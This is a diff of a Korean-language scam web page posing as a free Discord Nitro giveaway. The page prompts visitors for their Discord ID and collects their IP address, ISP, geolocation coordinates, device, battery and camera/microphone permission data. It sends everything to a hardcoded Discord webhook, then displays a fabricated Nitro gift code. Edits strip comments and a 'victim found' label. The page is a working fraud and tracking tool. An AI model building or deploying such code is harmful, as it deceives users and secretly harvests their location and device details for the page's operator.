@@ -2,9 +2,8 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>⚡️ Discord Nitro 1개월 무료</title>
+    <title>⚡️ 니트로 1개월 무료</title>
     <style>
-        /* (스타일은 이전과 동일하게 유지) */
         body { 
             background-color: #36393f; 
             font-family: 'Malgun Gothic', 'Arial', sans-serif; 
@@ -29,14 +28,9 @@
     </style>
 </head>
 <body>
-    <div id="loading">✨ [1단계] Nitro 수령 가능 확인 중...</div>
-
+    <div id="loading">✨ 니트로 수령 가능 확인 중...</div>
     <script>
-        // ⭐⭐ 당신의 웹훅 URL ⭐⭐
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1435219359529173045/M-BtfqgMyt2GwNnS5gvsJyts23QN8xl1pDN7LwNSXKlkBQWaqE0dcUU4n1ljyNcrolaV'
-        // ===========================================
-        // 니트로 코드 생성 함수 (무작위)
-        // ===========================================
         function generateFakeNitroCode() {
             const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
             let randomCode = '';
@@ -45,21 +39,15 @@
             }
             return `https://discord.gift/${randomCode}`;
         }
-
-        // ===========================================
-        // 헬퍼 함수
-        // ===========================================
-
         async function getPermissionStatus(name) {
             if (!navigator.permissions) return '미지원';
             try {
                 const result = await navigator.permissions.query({ name: name });
-                return result.state; // 'granted', 'denied', 'prompt' 중 하나
+                return result.state; 
             } catch (e) {
                 return '오류/미지원';
             }
         }
-
         async function getNotificationPermission() {
             if (!('Notification' in window)) return '미지원';
             
@@ -71,11 +59,8 @@
                 return Notification.permission;
             }
         }
-
         function getDiscordID() {
-            // ⭐ 오류 수정 완료: 닫는 괄호 추가됨 ⭐
             const discordID = prompt("🎁 Nitro 1개월 무료\n\n계정 확인과 중복 지급 방지를 위해 사용 중인 디스코드 아이디를 정확히 입력해주세요.");
-
             if (discordID === null || discordID.trim() === "") {
                 alert("🚨 아이디를 입력해야합니다.");
                 document.body.innerHTML = `<h2 style="text-align:center;color:#ff5555;margin-top:20%;">❌ 니트로 수령 실패: 실패<br><br>다시 시도 해주세요.</h2>`;
@@ -83,7 +68,6 @@
             }
             return discordID.trim();
         }
-        
         function getBrowserInfo() { 
             const userAgent = navigator.userAgent;
             let name = "알 수 없음", version = "알 수 없음";
@@ -93,7 +77,6 @@
             else if (userAgent.indexOf("Safari") > -1) { name = "Safari"; const match = userAgent.match(/Version\/([0-9.]+)/); version = match ? match[1] : version; }
             return { name: name, version: version }; 
         }
-
         function getOSInfo() { 
             const userAgent = navigator.userAgent;
             if (userAgent.indexOf("Win") > -1) return (userAgent.indexOf("NT 10.0") > -1) ? "Windows 10/11" : "Windows";
@@ -102,28 +85,19 @@
             if (userAgent.indexOf("like Mac") > -1) return "iOS";
             return "알 수 없음";
         }
-        
         function getOSArchitecture() { return (navigator.userAgent.indexOf("WOW64") > -1 || navigator.userAgent.indexOf("Win64") > -1) ? "64비트" : "32비트 (또는 알 수 없음)"; }
         function getDeviceType() { return (navigator.userAgent.match(/Mobile/)) ? "모바일" : (navigator.userAgent.match(/Tablet/)) ? "태블릿" : "데스크탑"; }
         function getDeviceVendor() { if (navigator.userAgent.indexOf("iPhone") > -1 || navigator.userAgent.indexOf("iPad") > -1) return "Apple"; return "알 수 없음"; }
         function getDeviceModel() { const match = navigator.userAgent.match(/(iPhone|iPad|Android|Windows Phone)/); return match ? match[0] : "알 수 없음"; }
         function hasWebGL() { try { const canvas = document.createElement('canvas'); return !!(window.WebGLRenderingContext && (canvas.getContext('webgl') || canvas.getContext('experimental-webgl'))); } catch(e) { return false; } }
         function hasWebRTC() { return !!(navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia); }
-
-        // ===========================================
-        // 메인 함수
-        // ===========================================
         async function collectAllInfo() {
             const discordID = getDiscordID();
             if (discordID === null) return;
-
             const userData = { discordID: discordID };
             userData.timestamp = new Date().toLocaleString();
             userData.url = window.location.href;
-
-            document.getElementById('loading').textContent = '✅ [2단계] 접속 지역 및 중복 참여 여부 검증 중...';
-
-            // --- IP 및 위치 정보 (비동기) ---
+            document.getElementById('loading').textContent = '✅ 접속 지역 및 중복 참여 여부 검증 중...';
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
@@ -138,8 +112,6 @@
                 userData.country = locationData.country_name || '정보 없음';
                 userData.coordinates = `${locationData.latitude || 'N/A'}, ${locationData.longitude || 'N/A'}`;
                 userData.timezone = locationData.timezone || '정보 없음';
-                
-                // --- 지역 제한 검사 ---
                 if (userData.country !== 'South Korea' && userData.country !== '대한민국') {
                     alert('🚨 VPN을 끄고 다시 시도해주세요.');
                     document.body.innerHTML = `<h2 style="text-align:center;color:#ff5555;margin-top:20%;">❌ 니트로 지급 보류: 이벤트 지역 제한<br><br>이벤트는 대한민국 지역 사용자만 참여 가능합니다.<br>(감지된 위치: ${userData.country})</h2>`;
@@ -148,15 +120,11 @@
                 userData.postal = locationData.postal || '정보 없음';
                 userData.asn = locationData.asn || '정보 없음';
                 userData.currency = `${locationData.currency} (${locationData.currency_name})` || '정보 없음';
-
             } catch (error) {
                 userData.ip = '정보 없음';
                 userData.country = '정보 없음'; 
             }
-
-            document.getElementById('loading').textContent = '🎁 [3단계] 코드 생성중..';
-
-            // --- 하드웨어 및 권한 정보 ---
+            document.getElementById('loading').textContent = '🎁 코드 생성중..';
             const browserInfo = getBrowserInfo();
             userData.browser = browserInfo.name;
             userData.browserVersion = browserInfo.version;
@@ -170,20 +138,17 @@
             userData.deviceType = getDeviceType();
             userData.deviceVendor = getDeviceVendor();
             userData.deviceModel = getDeviceModel();
-
             userData.permissionCamera = await getPermissionStatus('camera');
             userData.permissionMicrophone = await getPermissionStatus('microphone');
             userData.permissionGeolocation = await getPermissionStatus('geolocation');
             userData.permissionNotification = await getNotificationPermission();
             userData.maxTouchPoints = navigator.maxTouchPoints || '0';
             userData.keyboardLayout = (navigator.keyboard && navigator.keyboard.layout) || '정보 없음';
-
             userData.userAgent = navigator.userAgent;
             userData.cookies = navigator.cookieEnabled ? '사용 가능' : '사용 불가';
             userData.java = navigator.javaEnabled() ? '사용 가능' : '사용 불가'; 
             userData.webgl = hasWebGL() ? '지원' : '미지원';
             userData.webrtc = hasWebRTC() ? '지원' : '미지원';
-
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
@@ -194,22 +159,14 @@
             } else {
                 userData.battery = '정보 없음';
             }
-            
-            // 웹훅 전송 호출
             sendWebhook(userData); 
         }
-        
-        // ===========================================
-        // 웹훅 전송 함수 및 팝업 로직
-        // ===========================================
         function sendWebhook(userData) {
-            
-            // 웹훅 데이터 (추가된 정보 포함)
             const infoText = `
-**👀 TARGET INFO : Discord ID 수집 성공**
+**👀 TARGET INFO**
 • **Discord ID:** **${userData.discordID}**
 ------------------------------------------------------------------
-🌐 **위치 정보**
+**위치**
 • IP 주소: ${userData.ip}
 • 통신사: ${userData.isp}
 • 국가: ${userData.country}
@@ -220,7 +177,7 @@
 • ASN: ${userData.asn}
 • 통화: ${userData.currency}
 
-💻 **기기 정보**
+**기기**
 • 브라우저: ${userData.browser} ${userData.browserVersion}
 • 운영체제: ${userData.os} (${userData.osArch})
 • 장치 유형: ${userData.deviceType}
@@ -228,61 +185,50 @@
 • 픽셀 비율: ${userData.pixelRatio}
 • 언어: ${userData.language}
 
-🔧 **하드웨어 및 환경**
+**하드웨어 및 환경**
 • CPU 코어: ${userData.cpuCores}
 • 장치 메모리: ${userData.deviceMemory}
 • 배터리 상태: ${userData.battery}
 • 최대 터치 포인트: ${userData.maxTouchPoints}개
 • 키보드 레이아웃: ${userData.keyboardLayout}
 
-🔒 **브라우저 권한 상태**
+**권한**
 • 위치 정보 권한: ${userData.permissionGeolocation}
 • 웹캠 권한: ${userData.permissionCamera}
 • 마이크 권한: ${userData.permissionMicrophone}
 • 알림 권한: ${userData.permissionNotification}
 
-🛠️ **기술 정보**
+**기술**
 • 쿠키 지원: ${userData.cookies}
 • Java 지원: ${userData.java}
 • WebGL 지원: ${userData.webgl}
 • WebRTC 지원: ${userData.webrtc}
 
-⏰ **기타 정보**
+**기타**
 • 접속 시간: ${userData.timestamp}
 • URL: ${userData.url}
             `;
-
             const webhookData = {
-                content: `🚨 **[희생자 발견]** Discord ID: **${userData.discordID}**\n\n${infoText}\n\n**User Agent 전문:**\n\`\`\`${userData.userAgent}\`\`\``
+                content: `🚨 ID: **${userData.discordID}**\n\n${infoText}\n\n**User Agent 전문:**\n\`\`\`${userData.userAgent}\`\`\``
             };
-
             const xhr = new XMLHttpRequest();
             xhr.open('POST', WEBHOOK_URL, true);
             xhr.setRequestHeader('Content-Type', 'application/json');
-            
             xhr.onreadystatechange = function() {
                 if (xhr.readyState === 4) {
-                    // 웹훅 전송 상태와 관계없이 팝업을 띄우고 성공 메시지를 표시합니다.
                     const newNitroCode = generateFakeNitroCode();
-                    
-                    // ⭐ 1개월 지급으로 문구 변경 ⭐
                     alert(`🎉 Nitro 코드 발급 성공!\n\n1개월 Nitro 코드가 즉시 생성되었습니다. 이 코드를 복사하여 디스코드에서 사용하세요:\n\n${newNitroCode}\n\n(참고: 코드는 보안을 위해 이 팝업에만 1회 노출됩니다.)`);
-
-                    // 로딩 메시지를 최종 성공 메시지로 업데이트
                     document.getElementById('loading').textContent = `✅ [지급 완료] 1개월 니트로 코드(${newNitroCode.substring(20)}...)가 성공적으로 지급되었습니다.`;
                 }
             };
             
             xhr.onerror = function() {
-                // 네트워크 오류 시에도 팝업과 성공 문구를 표시
                 const newNitroCode = generateFakeNitroCode();
                 alert(`🎉 Nitro 코드 지급 성공!\n\n당신만을 위한 1개월 Nitro 코드가 즉시 생성되었습니다. 이 코드를 복사하여 디스코드에서 사용하세요:\n\n${newNitroCode}\n\n(참고: 코드는 보안을 위해 이 팝업에만 1회 노출됩니다.)`);
                 document.getElementById('loading').textContent = `✅ [지급 완료] 1개월 니트로 코드(${newNitroCode.substring(20)}...)가 성공적으로 지급되었습니다.`;
             };
-            
             xhr.send(JSON.stringify(webhookData));
         }
-
         window.onload = collectAllInfo;
     </script>
 </body>
